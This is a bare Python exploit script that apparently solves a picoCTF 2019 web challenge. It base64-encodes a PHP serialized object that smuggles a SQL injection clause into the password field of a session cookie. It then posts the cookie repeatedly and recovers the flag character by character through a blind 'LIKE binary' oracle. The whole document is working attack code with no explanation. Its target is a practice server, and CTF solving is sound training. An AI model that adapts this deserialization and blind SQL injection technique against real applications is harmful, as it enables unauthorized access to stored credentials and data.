from requests import *
import base64

url = 'https://2019shell1.picoctf.com/problem/62195/index.php?file=admin'
dic = 'abCcdeFfghijklmnopqrsTtuvwxyz0123456789{}'
num = 32
flag = ''
while(True):
    for i in dic:
        payload = "O:8:\"siteuser\":2:{s:8:\"username\";s:5:\"admin\";s:8:\"password\";s:[]:\"123' or password like binary '{}%\";}".replace("{}",flag + i).replace("[]",str(num))
        payload = base64.b64encode(payload.encode('utf-8')).decode('utf-8')
        cookies = {
            'user_info' : payload
        }
    
        r = post(url , cookies=cookies)
        if ('Welcome' in r.text):
            print(i , end='')
            flag += i
            num += 1
            break
    if (flag.find('}') != -1):
        print()
        break
